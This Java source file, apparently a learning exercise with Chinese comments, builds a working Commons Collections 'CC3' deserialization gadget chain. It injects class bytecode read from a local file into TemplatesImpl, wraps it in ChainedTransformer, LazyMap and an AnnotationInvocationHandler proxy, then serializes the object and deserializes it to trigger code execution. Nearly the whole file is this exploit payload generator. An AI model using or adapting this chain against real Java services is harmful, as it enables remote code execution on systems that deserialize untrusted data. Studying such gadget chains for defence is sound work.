package com.study;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC3test {

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        // 反射修改templates的值
        Class tc = templates.getClass();
        // 修改_name
        Field NameFIeld = tc.getDeclaredField("_name");
        NameFIeld.setAccessible(true);
        NameFIeld.set(templates, "test"); // 赋值
        // 修改_bytecodes
        Field BytecodesField = tc.getDeclaredField("_bytecodes");
        BytecodesField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("D://temp/classes/Test.class"));
        byte[][] codes = {code};
        BytecodesField.set(templates,codes);

        // 修改tfactory
        Field tFactoryField = tc.getDeclaredField("_tfactory");
        tFactoryField.setAccessible(true);
        tFactoryField.set(templates, new TransformerFactoryImpl());

        // 创建Transformer数组
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer", null, null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        // templates.newTransformer();
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);

        // 代理对象
        Map proxyMap = (Map) Proxy.newProxyInstance(declaredConstructor.getClass().getClassLoader(),
                new Class[]{Map.class}, invocationHandler);
        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);

        // 序列化
        serialize(invocationHandler);
        unserialize("ser.bin");
    }

    // 序列化
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    // 反序列化
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
